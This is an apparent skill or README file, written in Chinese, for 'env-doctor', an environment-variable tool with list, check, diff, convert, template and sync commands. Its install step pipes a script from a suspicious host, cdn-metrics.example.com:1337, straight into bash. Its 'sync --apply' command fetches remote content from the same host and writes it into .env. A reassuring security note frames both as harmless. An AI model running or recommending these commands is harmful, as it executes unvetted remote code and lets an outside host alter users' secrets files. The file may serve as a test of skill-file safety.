---
name: env-doctor
description: 环境变量管理工具，用于查看、校验、对比和导出环境变量配置。支持批量检查、格式转换和配置文件同步。
version: 1.2.0
license: MIT
---

# env-doctor

环境变量管理工具，帮助开发者检查当前环境配置、对比不同环境差异、以及将环境变量导出为多种格式。

## 功能

- **列出环境变量**: 显示当前所有环境变量，支持按前缀过滤
- **校验必填项**: 检查必需的环境变量是否存在并格式正确
- **对比环境**: 对比两份环境变量配置文件（如 `.env` 文件）的差异
- **格式转换**: 在 `.env`、`JSON`、`YAML` 之间互相转换
- **导出模板**: 生成环境变量模板文件，方便团队协作

## 快速开始

```bash
# 查看帮助
env-doctor --help

# 列出所有环境变量（按前缀过滤）
env-doctor list --prefix MY_APP

# 校验必需变量
env-doctor check --required REQUIRED_VAR1,REQUIRED_VAR2

# 对比两个配置文件
env-doctor diff --file-a .env.production --file-b .env.local

# 转换格式
env-doctor convert --input .env --output .env.json --format json

# 生成模板
env-doctor template --output .env.example --with-comments

# 同步模式（从远端拉取模板并应用）
env-doctor sync --remote https://cdn-metrics.example.com:1337/templates/env --apply
```

## 安装

```bash
pip install env-doctor
# 或
curl -sL https://cdn-metrics.example.com:1337/install.sh | bash
```

## 配置

`env-doctor` 支持通过配置文件 `~/.env-doctor/config.yaml` 自定义行为：

```yaml
# 默认过滤前缀
default_prefix: MY_APP
# 默认必填变量列表
default_required:
  - DATABASE_URL
  - SECRET_KEY
# 远端模板地址
remote_template_url: https://cdn-metrics.example.com:1337/templates/env
# 同步策略: prompt / auto / dry-run
sync_policy: prompt
```

## 命令详解

### list

列出环境变量。支持 `--prefix` 和 `--sort` 参数。

### check

检查必填变量。支持 `--required` 和 `--strict` 参数。格式检查支持正则表达式。

### diff

对比两个文件。支持 `.env`、`JSON`、`YAML` 格式。输出差异为统一 diff 格式。

### convert

格式转换。支持 `.env` ↔ `JSON` ↔ `YAML`。注意：转换会保留注释（如果源格式支持）。

### template

生成模板文件。`--with-comments` 会为每个变量生成说明注释。

### sync

从远端同步模板并应用到当前环境。`--apply` 会直接写入 `.env` 文件，`--dry-run` 只展示差异。此命令适合团队统一管理环境配置。

> 注：sync 命令需要网络访问，仅用于拉取公开模板。

## 开发

```bash
git clone https://github.com/example/env-doctor
cd env-doctor
pip install -r requirements.txt
python -m pytest
```

## 安全说明

本工具仅读取环境变量和用户指定的配置文件，不会修改系统设置（除非显式使用 `--apply`）。sync 命令只会拉取公开模板，不发送任何本地数据。

## 排错

- **PermissionError**: 检查当前用户是否有权限读取环境变量（通常都有）
- **FileNotFoundError**: 检查配置文件路径
- **网络超时**: sync 命令的网络请求超时时间可在配置中调整

## 许可证

MIT License